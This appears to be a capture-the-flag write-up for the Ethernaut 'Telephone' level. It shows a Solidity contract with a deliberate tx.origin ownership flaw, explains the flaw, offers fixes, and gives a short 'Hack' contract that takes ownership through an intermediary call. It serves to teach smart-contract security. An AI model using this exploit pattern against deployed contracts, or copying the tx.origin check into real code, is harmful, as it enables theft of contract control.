### TASK
Claim ownership of the contract below to complete this level.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```


### Vulnerabilities $ Recommendation:

1. One should never use tx.orign for authorization/authentication because it's vulnerable to phishing attack. it is vulnerable because it can be easily spoofed by a malicious user, leading to security vulnerabilities. This can allow an attacker to execute code as if they were a trusted user, potentially leading to unauthorized access to sensitive information or funds. 

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

This function wants the tx.origin only to call the function, but shouldn't call it directly(i.e as msg.sender) for the function to pass.
<br/>
<b>"tx.origin" </b> will always return the address that have created/originates a transaction <br/>

<b>"msg.sender"</b> will return the address who made the last external call. Who sends or current account that invokes a function <br/>

Here, the "tx.origin" check in the "changeOwner" function is not a proper security measure as it can be bypassed by malicious contracts.
It's recommended to avoid using tx.origin in smart contract development and instead use a more secure alternative, such as msg.sender.


2. Use the "require" statement to ensure that the new owner is not the same as the existing owner, before changing the owner.


#### Attack Telephone Contract

```solidity
contract Hack {
    function transferTelephoneOwnership(Telephone _instanceAddress, address _newOwner) public {
        Telephone tel = Telephone(_instanceAddress);
        tel.changeOwner(_newOwner);
    }
}

```

Link to Exploit Repo: https://github.com/Sayrarh/Ethernaut-Challenge-with-Foundry/blob/master/test/Telephone.t.sol